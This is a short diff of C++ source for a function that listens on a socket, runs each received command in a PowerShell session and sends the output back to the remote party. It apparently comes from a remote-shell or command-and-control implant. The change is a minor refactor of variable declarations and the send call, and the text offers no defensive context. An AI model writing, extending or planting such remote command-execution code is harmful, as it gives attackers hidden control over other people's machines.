@@ -10,6 +10,9 @@
 VOID CommandListenerLoop(SOCKET socket, PowerShellSession& psSession) {
     INT iBytesReceived;
     CHAR carrRecvbuf[4096];
+    uint32_t uiNetMessageLen;
+    std::string szCwd;
+    std::string szFinalCwd;
     std::string szFinalData;
     std::string szCommandOutput;
 
@@ -20,11 +23,11 @@ VOID CommandListenerLoop(SOCKET socket, PowerShellSession& psSession) {
         std::cout << "[+] Received command: " << command << "\n";
         szCommandOutput = psSession.RunCommand(command);
 
-        uint32_t uiNetMessageLen = htonl(szCommandOutput.size());
+        uiNetMessageLen = htonl(szCommandOutput.size());
         szFinalData = std::string(reinterpret_cast<char*>(&uiNetMessageLen), 4);
         szFinalData += szCommandOutput;
-        send(socket, szFinalData.data(), szFinalData.length(), 0);
 
+        send(socket, szFinalData.data(), szFinalData.length(), 0);
     }
 }
 
